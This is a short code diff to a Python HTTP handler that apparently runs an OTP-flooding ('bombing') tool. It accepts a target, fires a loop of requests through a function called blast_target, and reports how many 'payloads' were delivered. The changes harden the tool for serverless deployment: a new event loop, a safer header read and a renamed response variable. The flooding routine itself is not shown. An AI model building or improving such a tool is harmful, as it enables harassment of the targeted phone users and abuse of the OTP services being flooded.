@@ -76,7 +76,7 @@ class handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         try:
-            content_length = int(self.headers['Content-Length'])
+            content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
             body = json.loads(post_data.decode('utf-8'))
             
@@ -89,15 +89,18 @@ class handler(BaseHTTPRequestHandler):
                 self.wfile.write(json.dumps({'error': 'Target required'}).encode())
                 return
 
-            # Run the async bombing loop
-            success_count, total_count, details = asyncio.run(blast_target(target))
+            # Run the async bombing loop with a new event loop for serverless stability
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            success_count, total_count, details = loop.run_until_complete(blast_target(target))
+            loop.close()
 
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
             
-            response = {
+            resp_data = {
                 'status': 'complete',
                 'target': target,
                 'requests_fired': total_count,
@@ -105,7 +108,7 @@ class handler(BaseHTTPRequestHandler):
                 'message': f'OTP Flood complete. {success_count}/{total_count} payloads delivered.',
                 'details': details
             }
-            self.wfile.write(json.dumps(response).encode())
+            self.wfile.write(json.dumps(resp_data).encode())
             
         except Exception as e:
             self.send_response(500)
